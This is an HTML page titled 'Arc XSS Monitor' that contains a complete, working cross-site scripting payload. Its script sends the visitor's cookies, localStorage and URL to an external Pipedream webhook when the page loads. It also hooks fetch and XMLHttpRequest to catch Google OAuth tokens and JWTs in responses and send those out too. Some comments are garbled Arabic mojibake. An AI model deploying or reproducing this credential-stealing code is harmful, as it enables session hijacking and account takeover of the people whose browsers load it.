<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Arc XSS Monitor</title></head>
<body>
<script>
  const WEBHOOK = "https://eoeisd0pus6doy3.m.pipedream.net/";

  function exfiltrate(data) {
    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).catch(() => {});
  }

  function deepSearch(obj) {
    const secrets = [];
    function scan(obj, path = "") {
      if (!obj) return;
      if (typeof obj === "string") {
        // Ø§Ø­ØªÙ…Ø§Ù„ÙŠØ© ØªÙˆÙƒÙ†
        if (obj.includes("ya29.") || obj.includes("eyJhbGciOi")) {
          secrets.push({ path, value: obj });
        }
      } else if (typeof obj === "object") {
        for (let key in obj) {
          scan(obj[key], path + "." + key);
        }
      }
    }
    scan(obj);
    return secrets;
  }

  // Hook Ø¹Ù„Ù‰ fetch
  (function(){
    const origFetch = window.fetch;
    window.fetch = function(...args) {
      return origFetch.apply(this, args).then(async res => {
        const clone = res.clone();
        let bodyText = null;

        try { bodyText = await clone.text(); } catch {}

        let parsed = null;
        try { parsed = JSON.parse(bodyText); } catch {}

        const findings = deepSearch(parsed || bodyText);
        if (findings.length > 0) {
          exfiltrate({
            type: "ðŸ”¥ TOKEN FOUND in fetch",
            url: res.url,
            findings: findings,
            timestamp: new Date().toISOString()
          });

          alert("ðŸš¨ TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
        }

        return res;
      });
    };
  })();

  // Hook Ø¹Ù„Ù‰ XMLHttpRequest
  (function(){
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
      this._method = method;
      this._url = url;
      return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
      this.addEventListener("load", function() {
        let parsed = null;
        try { parsed = JSON.parse(this.responseText); } catch {}

        const findings = deepSearch(parsed || this.responseText);
        if (findings.length > 0) {
          exfiltrate({
            type: "ðŸ”¥ TOKEN FOUND in XHR",
            method: this._method,
            url: this._url,
            findings: findings,
            timestamp: new Date().toISOString()
          });

          alert("ðŸš¨ TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
        }
      });

      return origSend.apply(this, arguments);
    };
  })();

  // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¨Ø¯Ø£ÙŠØ©
  exfiltrate({
    type: "ðŸ”” XSS Page Loaded",
    userAgent: navigator.userAgent,
    cookies: document.cookie || "no cookies",
    localStorage: (() => {
      try { return { ...localStorage }; } catch { return "inaccessible"; }
    })(),
    url: location.href,
    timestamp: new Date().toISOString()
  });
</script>
<p style="font-family: sans-serif;">Loading...</p>
</body>
</html>
